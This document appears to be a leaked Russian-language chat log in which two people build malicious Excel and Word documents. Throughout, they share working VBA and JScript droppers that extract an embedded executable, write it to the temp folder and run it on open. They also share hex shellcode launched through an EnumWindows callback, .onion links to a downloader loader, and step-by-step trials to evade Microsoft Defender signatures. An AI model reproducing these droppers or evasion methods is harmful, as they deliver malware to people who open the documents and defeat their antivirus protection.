[09.02.22 10:19:36] jaime:		Еще вот такую штуку нашел: https://github.com/hasherezade/pe_to_shellcode
[09.02.22 10:20:09] jaime:		Пока не смотрел. По идее можно сделать шелкод и вставить его в док, и запустить без диска
[09.02.22 10:21:42] ryan:		Сейчас увидел такое - картинка в сохранённом документе хранится в папке media
То есть надо распаковать архив и достать картинку оттуда
Дальше сейчас смотрю
[09.02.22 10:22:23] jaime:		Я смотрел xls там нет папки :)
[09.02.22 10:22:55] ryan:		В ворде смотрю, сейчас гляну в xls
[09.02.22 10:23:26] jaime:		По идее через vbs один фиг должен быть
[09.02.22 10:24:27] jaime:		Можно тебе свой xls скинуть?
[09.02.22 10:24:57] ryan:		Присылай, посмотрю
[09.02.22 10:25:41] jaime:		
[09.02.22 10:26:40] ryan:		Скачал
[09.02.22 10:27:04] jaime:		Вот картинка с котиком содержит в себе нагрузку
[09.02.22 10:27:57] jaime:		Это hta
[09.02.22 10:28:07] jaime:		Запускающий калькулятор
[09.02.22 10:28:44] jaime:		
[09.02.22 10:28:51] jaime:		Вот он отдельно
[09.02.22 10:29:55] ryan:		В документе картинка лежит по адресу 0x361E, там будет строка "JFIF"
[09.02.22 10:30:35] jaime:		А туда можно добраться из скрипта при открытии?
[09.02.22 10:30:52] ryan:		Сейчас скрипт сделать попробую, которые прочитает картинку из документа из которого он запустился
[09.02.22 10:31:22] jaime:		О спасибо. :)  Было бы круто
[09.02.22 10:32:04] ryan:		Делал однажды vba скрипт, который считывает exe с конца документа. Сейчас найду его, переделаю чтобы читал картинку из середины документа
[09.02.22 10:34:26] jaime:		Да ты мне можешь скинуть наработку, я постараюсь разобраться
[09.02.22 10:34:40] jaime:		А вообще круто конечно без диска запускать
[09.02.22 10:34:49] ryan:		Сейчас ищу её
[09.02.22 10:36:18] ryan:		Нашёл пока на яваскрипте, сейчас на VBA найду:
```
	var FS = new ActiveXObject("Scripting.FileSystemObject");
	var fil = FS.GetFile(location.pathname.substr(1).replace(/[/]/g,"\\"));
	fpga = fil.OpenAsTextStream().Read(fil.Size);

	x = fpga.substr(117725, 468056);

	var fso = new ActiveXObject("Scripting.FileSystemObject");
	ts = fso.createTextFile(location.pathname.substr(1).replace(/[/]/g,"\\")+"..exe");
	ts.Write(x);
	ts.Close();

	x=new ActiveXObject("WScript.shell");
	x.run(location.pathname.substr(1).replace(/[/]/g,"\\")+"..exe");
```
[09.02.22 10:37:30] ryan:		Тут главная суть в том что файл открывается с помощью OpenTextAsStream, и его по байтикам можно разбирать, а не как строку
[09.02.22 10:40:49] jaime:		Да я думаю что переделаю.
[09.02.22 10:41:11] ryan:		```
Sub autoopen()
Set f = CreateObject("scripting.filesystemobject"): Set e = f.getfile(ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name):
Dim a(1000000 - 1) As Byte: s = e.Size - UBound(a) - 1: Dim b(1375733) As Byte:
Open (ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name) For Binary As #7: Get #7, 1, b: Close #7:

Dim key(5) As Byte
key(0) = 1: key(1) = 2: key(2) = 3: key(3) = 4: key(4) = 5:
j = 0
For i = 0 To (e.Size - s - 1)
    If (5 = j) Then j = 0
    a(i) = b(s + i) Xor key(j)
    j = j + 1
Next

Open (f.getspecialfolder(2) + "\\e.exe") For Binary As #1: Put #1, 1, a: Close #1: Shell (f.getspecialfolder(2) + "\\e.exe")
End Sub
```
[09.02.22 10:41:43] jaime:		Не очень конечно удобно, нужно привязаться к чему то
[09.02.22 10:42:08] ryan:		Делал для винворда, но для excel то же должно подойти
[09.02.22 10:43:07] ryan:		В гугле на нашёл такого на VBA, чтобы например получить разом список всех картинок из документа
[09.02.22 10:44:27] jaime:		Спасибо, попробую прикрутить. Если все в динамике то все время нужно как то смещения и размер отыскивать и передавать их скрипту
[09.02.22 10:48:37] ryan:		Dim b(1375733) - вот здесь смещение нужных данных прописывается в скрипте
[09.02.22 11:09:32] jaime:		Размер то я буду знать, а вот начало нужно будет искать. Но так как картинка будет только одна, думаю проблем не будет
[09.02.22 11:10:50] ryan:		Если картинка одна, то можно строку "JFIF" искать в прочитанных данных, сигнатура jpg файла
[09.02.22 11:11:55] ryan:		Или искать искать строку hta скрипта, смещение её в картинке будет известно, легко можно будет получить смещение начала картинки в файле
[09.02.22 11:13:08] jaime:		Что то столько возможностей, голова разбегается! :)
[10.02.22 12:22:29] jaime:		Привет. Я сделал картинку добавив в нее двоичные данные. pict + key + binary. Вставил в xls. Нашел ее в файле выдернул данные, а они блин битые. Видимо что то там excel при вставке искажает
[10.02.22 12:23:37] ryan:		Привет
[10.02.22 12:24:34] ryan:		А hta файл запускается из картинки ? Или до его запуска не доходит, файл битый создаётся ?
[10.02.22 12:27:50] jaime:		Битый файл
[10.02.22 12:28:09] jaime:		Я уж думал что что то в скрипте не то.
[10.02.22 12:28:33] jaime:		Выдернул прямо через dd, все аналогично
[10.02.22 12:32:42] ryan:		Картинку можно ещё через вставку объекта сделать, но тогда картинка будет просто в виде значка отображаться. Но excel с ней ничего делать скорее всего не будет
[10.02.22 12:34:29] jaime:		А пофиг думаю, я уже думаю просто в ячейку base64 засунуть
[10.02.22 12:35:11] ryan:		Если больших ограничений на размер ячейки нет, то тогда хорошая идея
[10.02.22 12:36:04] jaime:		Попробую вначале как объект
[10.02.22 12:45:22] jaime:		О с объектом работает!
[10.02.22 13:08:56] ryan:		Объекты вроде всегда должн в неизменном виде храниться, в виде точной бинарной копии, без редактирования
[10.02.22 13:19:02] jaime:		Да нормально мне кажется получилось
[10.02.22 13:19:10] jaime:		Сейчас еще сделаю запуск шелкода
[10.02.22 13:47:58] jaime:		Шел код долго запускается RtlMoveMemory медленно работает
[10.02.22 13:49:16] ryan:		На memcpy из msvcrt.dll можно попробовать заменить, она быстрее должна быть
[10.02.22 13:51:16] jaime:		Не это я тупанул :) нормально шелл на 250кб
[14.02.22 09:22:29] jaime:		Привет. :)
[14.02.22 09:35:26] ryan:		Привет
[14.02.22 09:40:40] jaime:		Ты не знаешь как можно замаскировать запуcк приложения из vba?
[14.02.22 09:40:58] jaime:		Обфускация только хуже делает
[14.02.22 09:42:43] jaime:		Пробовал так CreateObject("WScript.Shell").Run cmdLine, 0 и так CallByName CreateObject("WScript.Shell"), "Run", VbMethod, cmdLine и черер WMI
[14.02.22 09:43:37] jaime:		С абфускайиций даже calc не запускается, деф сразу блочит
[14.02.22 09:43:59] ryan:		Я шеллкод маскировал таким способом:
```
Private Declare Function EnumWindows Lib "user32.dll" (ByVal p2 As String, ByVal p4 As Long) As Long
Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
Sub AutoOpen(): Call EnumWindows(h("E8000000005D64A1300000008B400C8B40148B008B008B4010898560010000E8BA00000089855C010000E80D0000004C6F61644C6962726172794100FFB560010000FF955C010000898568010000E80B0000007573657233322E646C6C00FF9568010000898564010000E80C0000004D657373616765426F784100FFB564010000FF955C01000089856C0100006A00E80F00000054657374207368656C6C636F646500E80D00000054657374206D657373616765006A00FF956C010000E80C0000004578697450726F6365737300FFB560010000FF955C0100006A00FFD091535685C974778B413C8D4408788B108D04118B501885D274648B58208D1C198B338D3431813E47657450754B817E04726F63417542817E08646472657539817E0B657373007530F7DA8B70188D14168B70248D34310FB714568B701C8D34318B34968B1039D672158B580401D339DE730C8D04315E5BC383C3044A75A231C05E5BC30000000000000000000000000000000000000000"), 0): End Sub
```
Тут минимум кода на VBA, и нет палевных вызовов из Wcript.Shell
[14.02.22 09:44:55] jaime:		А шел уже dll ку запускает?
[14.02.22 09:45:25] ryan:		Да, либо exe запускает либо dll грузит через LoadLibrary
[14.02.22 09:46:05] ryan:		EXE или DLL можно хранить в конце doc файла, в шифрованном виде
[14.02.22 09:46:29] ryan:		Или в виде объекта
[14.02.22 09:46:40] jaime:		А у тебя нет исходника шела? Тут видимо нужно на асме. А еще нужно ведь два варианта для 32 и 64?
[14.02.22 09:47:30] ryan:		В этом примере шелл 32 битный, он просто месседжбокс выводит
[14.02.22 09:48:02] ryan:		Сейчас найду с запуском exe, делал в прошлом году
[14.02.22 09:49:13] jaime:		Я на С то могу сделать, но там размер будет :)
[14.02.22 09:56:27] ryan:		```
http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/ldr_shell.asm
```
[14.02.22 09:57:00] ryan:		Там лоадер в виде шеллкода, скачивает и запускает exe
[14.02.22 09:58:02] ryan:		В скомпиленном виде 1500 байт, то есть vba скрипт в результате будет где-то 3,5 Kb размером
[14.02.22 09:59:16] ryan:		Шелл там сейчас 32 битный, но в самом начале та предусотрена проверка на текущую битность и переход на 32 либо 64 битный код. 64 битный шелл пока ещё не сделал
[14.02.22 09:59:25] jaime:		А можно еще файлик win32a.inc ?
[14.02.22 09:59:35] ryan:		Сейчас пришлю
[14.02.22 09:59:42] jaime:		А каким asm  собирать?
[14.02.22 10:00:03] ryan:		Fasm
[14.02.22 10:00:07] jaime:		masm, tasm, nasm ?
[14.02.22 10:00:16] jaime:		О! :)
[14.02.22 10:01:47] ryan:		```
http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/win32a.inc
```
[14.02.22 10:03:59] jaime:		Спасибо. А в нем все закоментировано судя по всему
[14.02.22 10:08:45] ryan:		В win32a.inc ?
[14.02.22 10:09:33] jaime:		А все inc  есть в самом fasm
[14.02.22 10:10:05] ryan:		В папке Include должны быть
[14.02.22 10:29:35] jaime:		Собрал.  Блин ничего не понятно. :)
[14.02.22 11:10:10] ryan:		Забыл написать батник для сборки:
```
del poc.bin,32_64.exe&fasm 32_64.asm&haxor/bin 32_64.exe poc.bin /S=START_MARKER /E=END_MARKER
```
[14.02.22 11:10:39] ryan:		Извлечёт из скомпиленного exe шеллкод и поместит его в файл poc.bin
[14.02.22 11:15:42] jaime:		А из документа нужно запускать только соответствующий шел или можно всегда 32?
[14.02.22 11:18:07] jaime:		А что за утилита haxor ?
[14.02.22 11:18:38] ryan:		Там общий шелл можно сделать, для 32 бит и для 64. 
В самом начале шеллкода стоит проверка на текущую битность и переход на соответствующий шеллкод
Пока там только 32 битный, 64 битный ещё не сделал
[14.02.22 11:18:42] ryan:		Сейчас пришлю её
[14.02.22 11:20:13] ryan:		```
http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/haxor.rar
```
Утилита, выдирает из файла фрагмент, ограниченный с начала и конца определёнными метками
[14.02.22 11:22:17] jaime:		Все ок спасибо.
[14.02.22 11:22:33] jaime:		Мне нужно dllку запустить, подправить думаю смогу
[14.02.22 11:23:00] jaime:		Но вот с ветками по 64 и 32 бита это врядли :)
[14.02.22 11:30:21] jaime:		на вот этот код есть детект
[14.02.22 11:31:36] ryan:		Дефендер ловит ?
[14.02.22 11:31:48] jaime:		ага
[14.02.22 11:31:54] jaime:		хоть он даже и не работает
[14.02.22 11:32:04] jaime:		я в 64 бита его вставил просто глянуть
[14.02.22 11:32:05] ryan:		А такой детектит ?
```
Private Declare Function EnumWindows Lib "user32.dll" (ByVal p2 As String, ByVal p4 As Long) As Long
Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
Sub AutoOpen(): Call EnumWindows(h(""), 0): End Sub
```
[14.02.22 11:37:16] jaime:		Извлечёт из скомпиленного exe шеллкод и поместит его в файл poc.bin
11:15
А из документа нужно запускать только соответствующий шел или можно всегда 32?
А что за утилита haxor ?
11:18
Там общий шелл можно сделать, для 32 бит и для 64.
В самом начале шеллкода стоит проверка на текущую битность и переход на соответствующий шеллкодыыы
[14.02.22 11:37:39] jaime:		Ага то же есть детект
[14.02.22 11:40:40] ryan:		На одну эту строку есть детект ?
```
Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
```
[14.02.22 11:42:11] jaime:		Сейчас займусь изучением :)
[14.02.22 12:58:12] jaime:		```
Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function

Sub Workbook_Open()
End Sub

```
[14.02.22 12:58:22] jaime:		Да вот так уже есть детект
[14.02.22 12:59:18] ryan:		Имена переменных и функции можно попробовать сменить, скорее всего они палятся
[14.02.22 13:00:01] jaime:		```

Function decode(e): For s = 1 To Len(e) Step 2:  Next: End Function
Sub Workbook_Open()

End Sub

```
[14.02.22 13:00:08] jaime:		Вот так уже нет
[14.02.22 13:01:10] ryan:		Вот в этом фрагменте сигнатура значит:
```
h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2))))
```
[14.02.22 13:03:27] ryan:		Вот так палится ?
```
Function QQQ(AAA): For BBB = 1 To Len(AAA) Step 2: QQQ = QQQ & Chr("&h" & Mid(AAA, BBB, 2)): Next: End Function
```
[14.02.22 13:06:14] jaime:		```
Function decode(e): For s = 1 To Len(e) Step 2: decode = decode & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
Sub Workbook_Open(): End Sub
```
[14.02.22 13:06:20] jaime:		Вот так нет
[14.02.22 13:06:37] jaime:		Похоже не Private Declare Function EnumWindows Lib "user32.dll" (ByVal p2 As String, ByVal p4 As Long) As Long
[14.02.22 13:06:44] jaime:		Вот на это то же детект
[14.02.22 13:12:12] ryan:		```
n = "P" + "r" + "ivate Declare Function EnumWindows Lib ""user32.dll"" (ByVal p2 As String, ByVal p4 As Long) As Long"
Execute n
```
[14.02.22 13:12:28] ryan:		Вот так можно всю строку змаскировать (или вообще весь скрипт)
[14.02.22 13:17:08] jaime:		Это что то типа Eval ?
[14.02.22 13:17:17] jaime:		Ругается
[14.02.22 13:17:23] ryan:		Да, как Eval в яваскрите
[14.02.22 13:17:49] jaime:		В xls eval странно раюотает
[14.02.22 13:20:34] ryan:		Буквы ещё можно поксорить, типа так:
```
a =  chr(asc("P") xor 55 xor 55) +  chr(asc("r") xor 55 xor 55) ... и т.д.
```
[14.02.22 13:30:47] jaime:		Да я суть понимаю, я в javascript похожую тему использовал
[14.02.22 13:59:49] jaime:		Что то не получается, ни в какую :)
[14.02.22 14:10:47] ryan:		Дефендер детектит или скрипт не запускается ?
[14.02.22 14:15:12] jaime:		Скрипт не запускается
[14.02.22 14:16:19] ryan:		Ошибки vba выдаёт какие-нибудь ?
[14.02.22 14:18:30] jaime:		Sub or function not  defined
[14.02.22 14:18:41] jaime:		На Execute
[14.02.22 14:29:33] ryan:		Сейчас попробую через Application.Run сделать ещё
[14.02.22 14:31:20] jaime:		Извини что отвлекаю. :(
[14.02.22 15:11:33] ryan:		Evaluate из ячеек только текст берёт, не из строки
Но Eval похожая на ту что есть в яваскрипте точно должна быть, сейчас ещё поищу
[14.02.22 15:20:40] ryan:		А вот так палится ?
```
Private Declare Function EnumWindows Lib "user32.dll" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBBBB As Long) As Long
```
[14.02.22 15:28:25] jaime:		Сейчас
[14.02.22 15:29:59] jaime:		TrojanDownloader:Win32/Powdow!ml
[14.02.22 15:30:03] jaime:		Ага
[14.02.22 15:30:22] jaime:		```
Private Declare PtrSafe Function EnumWindows Lib "user32.dll" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBBBB As Long) As Long
Sub Workbook_Open()
End Sub

```
[14.02.22 15:30:50] ryan:		А так ?
```
Private Declare Function EnumWindows Lib "" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBBBB As Long) As Long
```
[14.02.22 15:31:43] ryan:		И ещё так:
```
Private Declare Function MessageBoxA Lib "" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBBBB As Long) As Long
```
[14.02.22 15:35:35] ryan:		Если на строку EnumWindows реагирует тогда api попробую другую подыскать из user32.dll
[14.02.22 15:40:39] ryan:		Попробуй вот так, с другой API сделал:
```
Private Declare Function EnumDisplayMonitors Lib "user32.dll" (ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As String, ByVal p4 As Long) As Long
Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
Sub AutoOpen(): Call EnumDisplayMonitors(0,0,h("E8000000005D64A1300000008B400C8B40148B008B008B4010898560010000E8BA00000089855C010000E80D0000004C6F61644C6962726172794100FFB560010000FF955C010000898568010000E80B0000007573657233322E646C6C00FF9568010000898564010000E80C0000004D657373616765426F784100FFB564010000FF955C01000089856C0100006A00E80F00000054657374207368656C6C636F646500E80D00000054657374206D657373616765006A00FF956C010000E80C0000004578697450726F6365737300FFB560010000FF955C0100006A00FFD091535685C974778B413C8D4408788B108D04118B501885D274648B58208D1C198B338D3431813E47657450754B817E04726F63417542817E08646472657539817E0B657373007530F7DA8B70188D14168B70248D34310FB714568B701C8D34318B34968B1039D672158B580401D339DE730C8D04315E5BC383C3044A75A231C05E5BC30000000000000000000000000000000000000000"), 0): End Sub
```
[14.02.22 15:45:00] ryan:		Отойду на час
[14.02.22 16:10:37] jaime:		Блин аналогично TrojanDownloader:Win32/Powdow!ml
[14.02.22 16:16:56] jaime:		```
Private Declare PtrSafe Function EnumDisplayMonitors Lib "user32.dll" (ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As String, ByVal p4 As Long) As Long



Function decode(e): For s = 1 To Len(e) Step 2: decode = decode & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function

Sub Workbook_Open(): Call EnumDisplayMonitors(0, 0, decode("E8000000005D64A1300000008B400C8B40148B008B008B4010898560010000E8BA00000089855C010000E80D0000004C6F61644C6962726172794100FFB560010000FF955C010000898568010000E80B0000007573657233322E646C6C00FF9568010000898564010000E80C0000004D657373616765426F784100FFB564010000FF955C01000089856C0100006A00E80F00000054657374207368656C6C636F646500E80D00000054657374206D657373616765006A00FF956C010000E80C0000004578697450726F6365737300FFB560010000FF955C0100006A00FFD091535685C974778B413C8D4408788B108D04118B501885D274648B58208D1C198B338D3431813E47657450754B817E04726F63417542817E08646472657539817E0B657373007530F7DA8B70188D14168B70248D34310FB714568B701C8D34318B34968B1039D672158B580401D339DE730C8D04315E5BC383C3044A75A231C05E5BC30000000000000000000000000000000000000000"), 0): End Sub

```
[14.02.22 16:17:05] jaime:		А вот это чисто! :)
[14.02.22 17:32:38] ryan:		Значит на API EnumWindows детект был
[15.02.22 08:02:01] jaime:		Привет.
[15.02.22 08:02:25] jaime:		А у тебя твой шел из vba запускается?
[15.02.22 08:02:44] jaime:		У меня падает Excel
[15.02.22 08:03:14] jaime:		Сделал шел по вот этой доке:
[15.02.22 08:03:18] jaime:		```
https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c
```
[15.02.22 08:04:27] jaime:		Сам шел работает, а вот запуск из vba нет. Твой почему то то же. :(
[15.02.22 08:05:26] ryan:		Привет
[15.02.22 08:05:48] ryan:		На 32 битной или 64 битной системе запускается ?
[15.02.22 08:06:02] jaime:		на 64
[15.02.22 08:06:16] jaime:		Офис то же 64
[15.02.22 08:07:21] ryan:		Он запустился нормально из тестового приложения потому что оно было 32 битным. Excel 64 битный, поэтому падает, там 64 битного шеллкода пока нет
[15.02.22 08:08:23] ryan:		Если срочно 64 битный шелл нужен, до дописать могу
[15.02.22 08:09:01] jaime:		Допиши plz.
[15.02.22 08:09:22] jaime:		Даже скачивать не нужно просто загрузка dll и выполнение ф-ции
[15.02.22 08:10:12] jaime:		я свой шел сделал он выдает msgbox и в цикле спит
[15.02.22 08:10:20] jaime:		Запускаю как шел работает
[15.02.22 08:10:25] jaime:		Вставляю в док нет
[15.02.22 08:10:52] ryan:		Ok, сделаю 64 битный тогда
[15.02.22 08:11:27] jaime:		Большое спасибо.
[15.02.22 08:41:44] jaime:		Нужна утилитка bin to vba?
[15.02.22 08:43:09] ryan:		Да, присылай
[15.02.22 08:52:13] jaime:		```
https://dropfiles.me/download/23264d0cceb5f99c/#7fHSDBVlv_G7jLrz808jrA
```
[15.02.22 08:52:23] jaime:		109dbb161bfe9d97f22c8a62f53e0035
[15.02.22 08:53:19] jaime:		Там собственно исходник на питоне, собранный exe. тестовый шел. И прожка для запуска шела
[15.02.22 08:57:31] ryan:		Скачал
[15.02.22 10:50:55] jaime:		Деф это жесть, вчера не было детектов сегодня уже есть
[15.02.22 10:53:01] ryan:		Если инет был включен то он в облако отправляет подозрительный файлы
[15.02.22 10:54:06] jaime:		облако выключено
[15.02.22 10:54:24] jaime:		Мне сказали проверять как у пользователей
[15.02.22 10:59:16] jaime:		Иначе получается у меня нет детектов у тестеров есть. :( замкнутый круг
[15.02.22 11:01:46] ryan:		Переделал полностью на Winapi:
```
http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/test.vba
```
[15.02.22 11:02:33] ryan:		Сбрасывает в папку %temp% файл и запускает его
[15.02.22 11:03:16] ryan:		Сейчас перезалью, ьитый скачивается
[15.02.22 11:06:21] ryan:		```
http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/test2.vba
```
[15.02.22 11:30:59] ryan:		Скачалось ?
[16.02.22 14:25:19] jaime:		Привет. :)
[16.02.22 14:25:36] jaime:		Ты помню писал способы скачать файл
[16.02.22 14:26:09] jaime:		Все API палятся
[16.02.22 14:26:15] jaime:		```
Private Declare PtrSafe Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare PtrSafe Function InternetCloseHandle Lib "wininet" (ByVal hInet As Long) As Integer
Private Declare PtrSafe Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare PtrSafe Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Private Declare PtrSafe Function lcreat Lib "kernel32" Alias "_lcreat" (ByVal p1 As String, ByVal p2 As Long) As Long
Private Declare PtrSafe Function lwrite Lib "kernel32" Alias "_lwrite" (ByVal p1 As Long, ByVal p2 As String, ByVal p3 As Long) As Long
Private Declare PtrSafe Function lclose Lib "kernel32" Alias "_lclose" (ByVal p1 As Long) As Long

```
[16.02.22 14:26:30] jaime:		Любую из них вставляешь и все детект
[16.02.22 14:26:55] jaime:		Но WinExec детект не дает
[16.02.22 14:27:08] ryan:		Привет
[16.02.22 14:27:27] ryan:		А на _lcreat/_lwrite детект есть ?
[16.02.22 14:27:33] jaime:		есть
[16.02.22 14:27:54] ryan:		UrlDownloadToFile(A|W) можно ещё попробовать
[16.02.22 14:28:36] ryan:		InterneetOpenA т InternetOpenUrlA ещё можно попробовать заменить на InternetOpenW и InternetOpenUrlW
[16.02.22 14:29:08] jaime:		А как потом сохранить на диск?
[16.02.22 14:29:34] jaime:		ты помню как то писал что можно через word файл скачать, не прокатит?
[16.02.22 14:29:34] ryan:		UrlDownloadToFile сразу в файл пишет, указанный в её параметрах
[16.02.22 14:29:47] jaime:		Сейчас гляну! :)
[16.02.22 14:30:11] ryan:		Командой winword <url> или winword <excel> можно
[16.02.22 14:30:39] ryan:		Но там надо будет как-то искать файл в папке %temp%
[16.02.22 14:31:14] jaime:		URLDownloadToFile кстати нет детекта
